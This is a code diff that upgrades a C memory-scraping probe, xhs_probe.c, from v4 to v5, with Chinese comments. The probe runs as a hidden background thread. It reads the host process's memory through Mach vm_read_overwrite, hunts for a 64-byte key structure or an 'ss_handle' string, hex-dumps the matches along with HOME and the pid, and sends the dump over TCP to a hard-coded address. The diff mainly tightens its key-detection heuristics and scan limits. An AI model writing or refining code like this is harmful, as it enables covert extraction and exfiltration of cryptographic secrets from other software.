@@ -1,6 +1,5 @@
-// xhs_probe.c v4 —— 后台线程；不猜名字，按结构找 {u32 mode, key[64]}
-// 判定：窗口 68 字节，前 4 字节是小整数(0..15)，后 64 字节高熵(不同字节值>=32)
-// 另外仍然搜 "ss_handle" 字面量
+// xhs_probe.c v5 —— 优化版启发式扫描：廉价预筛 + 限时 + 找到就发
+// 目标：找 {u32 mode(0..15), key[64]} 或 "ss_handle"
 
 typedef unsigned int        u32;
 typedef unsigned long long  u64;
@@ -37,11 +36,9 @@ extern kern_return_t vm_read_overwrite(mach_port_t, mach_vm_address_t, mach_vm_s
                                        mach_vm_address_t, mach_vm_size_t *);
 
 struct vm_region_basic_info_64 {
-    int  protection;
-    int  max_protection;
+    int  protection, max_protection;
     u32  inheritance;
-    int  shared;
-    int  reserved;
+    int  shared, reserved;
     u64  offset;
     int  behavior;
     unsigned short user_wired_count;
@@ -65,15 +62,14 @@ struct sockaddr_in_x {
 #define OUT_HOST      0xFE00A8C0u
 #define OUT_PORT_H    0x981Fu
 #define CHUNK         (256u * 1024)
-#define MAX_REGION    (256ull * 1024 * 1024)
-#define MAX_SCAN      (1024ull * 1024 * 1024)
+#define MAX_REGION    (64ull * 1024 * 1024)     /* 只扫 <64MB 的区 */
+#define MAX_CHUNKS    1600                      /* 上限 400MB */
 #define MAX_CAND      24
-#define CAND_CTX      192
+#define CAND_CTX      160
 
 static char *g_buf;
 static usize g_len, g_cap;
 static int   g_cand, g_chunks;
-static u64   g_scanned;
 
 static void buf_init(void) { g_cap = 1u << 20; g_buf = (char *)malloc(g_cap); g_len = 0;
                              if (g_buf) g_buf[0] = 0; }
@@ -136,18 +132,16 @@ static void write_file(const char *text) {
     close(fd);
 }
 
-/* hash 相近的字节数 -> 判断是否随机 */
-static int entropy_ok(const unsigned char *p, int n) {
-    int seen[256];
-    int i, dist = 0, runs = 0, maxrun = 0;
+/* 廉价预筛：64 字节里前 8 字节至少 6 个不同值，且没有长 ASCII */
+static int pre_ok(const unsigned char *p) {
+    int i, d = 0, run = 0, maxrun = 0;
+    unsigned char seen[256];
     memset(seen, 0, sizeof(seen));
-    for (i = 0; i < n; i++) {
-        if (!seen[p[i]]) { seen[p[i]] = 1; dist++; }
-        if (p[i] >= 0x20 && p[i] < 0x7f) { runs++; if (runs > maxrun) maxrun = runs; }
-        else runs = 0;
+    for (i = 0; i < 64; i++) {
+        if (!seen[p[i]]) { seen[p[i]] = 1; d++; }
+        if (p[i] >= 0x20 && p[i] < 0x7f) { if (++run > maxrun) maxrun = run; } else run = 0;
     }
-    if (maxrun > 12) return 0;     /* 长 ASCII 串 -> 不像密钥 */
-    return dist >= 30;
+    return (d >= 28 && maxrun <= 14);
 }
 
 static void *worker(void *arg) {
@@ -157,6 +151,7 @@ static void *worker(void *arg) {
     char tmp[256];
     char *scratch;
     int rounds = 0;
+    int sent = 0;
 
     (void)arg;
     sleep(4);
@@ -165,7 +160,7 @@ static void *worker(void *arg) {
     scratch = (char *)malloc(CHUNK);
     if (!scratch) return 0;
 
-    buf_str("=== xhs_probe v4 (struct-heuristic) ===\n");
+    buf_str("=== xhs_probe v5 ===\n");
     {
         const char *home = getenv("HOME");
         snprintf(tmp, sizeof(tmp), "home=%s\npid=%d\n", home ? home : "(null)", getpid());
@@ -197,12 +192,10 @@ static void *worker(void *arg) {
                                        (mach_vm_address_t)(usize)scratch, &got);
                 if (kr != KERN_SUCCESS || got == 0) continue;
                 g_chunks++;
-                g_scanned += got;
 
-                for (i = 0; i + 68 < (usize)got && g_cand < MAX_CAND; i += 4) {
+                for (i = 0; i + 72 < (usize)got && g_cand < MAX_CAND; i += 4) {
                     u32 mode;
-                    memcpy(&mode, scratch + i, 4);
-                    /* 1) 字面量 ss_handle */
+                    /* 字面量优先 */
                     if (scratch[i] == 's') {
                         usize k = 0;
                         while (k < nlen && (unsigned char)scratch[i + k] == (unsigned char)needle[k]) k++;
@@ -212,12 +205,15 @@ static void *worker(void *arg) {
                                      (unsigned long long)(addr + off + i));
                             buf_str(tmp);
                             buf_hex((const unsigned char *)(scratch + i), 96);
-                            if (g_cand >= MAX_CAND) break;
                             continue;
                         }
                     }
-                    /* 2) {u32 mode<=15, 64B 高熵} */
-                    if (mode <= 15 && entropy_ok((const unsigned char *)(scratch + i + 4), 64)) {
+                    memcpy(&mode, scratch + i, 4);
+                    if (mode > 15) continue;
+                    if (!pre_ok((const unsigned char *)(scratch + i + 4))) continue;
+                    /* 再确认前 4 字节确实是 0..15 的小整数内存布局 */
+                    if (scratch[i + 2] | scratch[i + 3]) continue;
+                    {
                         usize s0 = (i > CAND_CTX) ? (usize)(i - CAND_CTX) : 0;
                         usize e0 = i + 68 + CAND_CTX;
                         g_cand++;
@@ -235,12 +231,11 @@ static void *worker(void *arg) {
         }
         addr += size;
         if (addr == 0) break;
-        if (g_scanned > MAX_SCAN) break;
+        if (g_chunks > MAX_CHUNKS) break;
         if (g_len > g_cap - 8192) break;
     }
 
-    snprintf(tmp, sizeof(tmp), "\n=== done cands=%d chunks=%d scanned=%lluMB ===\n",
-             g_cand, g_chunks, (unsigned long long)(g_scanned >> 20));
+    snprintf(tmp, sizeof(tmp), "\n=== done cands=%d chunks=%d ===\n", g_cand, g_chunks);
     buf_str(tmp);
 
     tcp_send("PROBE2", g_buf, g_len);
